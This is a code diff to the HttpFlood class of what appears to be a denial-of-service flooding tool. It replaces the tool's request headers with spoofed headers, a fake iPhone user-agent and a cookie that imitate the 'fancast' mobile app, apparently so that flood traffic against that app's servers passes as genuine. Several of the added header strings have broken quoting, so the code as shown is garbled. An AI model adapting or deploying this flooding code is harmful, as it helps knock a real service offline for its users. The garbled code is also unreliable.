@@ -760,21 +760,23 @@ class HttpFlood(Thread):
         self._defaultpayload = "%s %s HTTP/1.1\r\n" % (self._req_type,
                                                       target.raw_path_qs)
         self._payload = (self._defaultpayload +
-                         'content-type: application/json\r\n'
-                         'x-api-token: \r\n'
-                         'version: 1.0.1\r\n'
-                         'community-display-type: list\r\n'
-                         'build-mode: release\r\n'
-                         'accept-language: en-CN\r\n'
-                         'accept-encoding: gzip\r\n'
-                         'community-tab-index: 0\r\n'
-                         'select-language: \r\n'
-                         'package: com.contentsmadang.fancast\r\n'
-                         'user-agent: Dart/2.18 (dart:io)\r\n'
-                         'system-language: zh-CN\r\n'
-                         'connection: Keep-Alive\r\n'
-                         'device: 2\r\n'
-                         'brightness: dark\r\n')
+                         'Brightness: dark\r\n'
+                         'X-API-TOKEN: \r\n'
+                         'Accept-Encoding: gzip\r\n' deflate\r\n' br\r\n'
+                         'Version: 1.0.1\r\n'
+                         'Connection: Keep-Alive\r\n'
+                         'Community-Tab-Index: 0\r\n'
+                         'Content-Type: application/json\r\n'
+                         'Community-Display-Type: list\r\n'
+                         'System-Language: zh-CN\r\n'
+                         'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML\r\n' like Gecko) Mobile/15E148 fancast_app\r\n'
+                         'Device: 2\r\n'
+                         'Cookie: header={"Select-Language":"","Community-Tab-Index":"0","Connection":"Keep-Alive","Device":"2","X-API-TOKEN":"","Brightness":"dark","Content-Type":"application/json","Build-Mode":"release","Community-Display-Type":"list","System-Language":"zh-CN","Version":"1.0.1","Accept-Language":"en-CN","Package":"com.contentsmadang.fancast"}\r\n'
+                         'Build-Mode: release\r\n'
+                         'Package: com.contentsmadang.fancast\r\n'
+                         'Accept-Language: en-CN\r\n'
+                         'Accept: text/html\r\n'application/xhtml+xml\r\n'application/xml;q=0.9\r\n'*/*;q=0.8\r\n'
+                         'Select-Language: \r\n')
 
     def select(self, name: str) -> None:
         self.SENT_FLOOD = self.GET
